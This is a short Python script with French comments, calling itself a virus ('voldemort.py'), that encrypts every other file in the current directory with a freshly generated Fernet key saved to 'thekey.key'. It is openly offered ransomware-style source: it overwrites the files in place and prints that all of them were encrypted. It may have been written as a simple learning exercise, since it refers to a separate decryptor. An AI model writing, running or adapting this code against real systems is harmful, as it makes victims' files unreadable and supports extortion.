#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# --- Étape 1 : Trouver les fichiers ---
files = []
for file in os.listdir():
    # On évite d'encrypter le virus et la clé
    if file == "voldemort.py" or file == "thekey.key" or file == "decryptor.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# --- Étape 2 : Générer la clé ---
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# --- Étape 3 : Encrypter les fichiers ---
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Succès : Tous les fichiers ont été encryptés.")
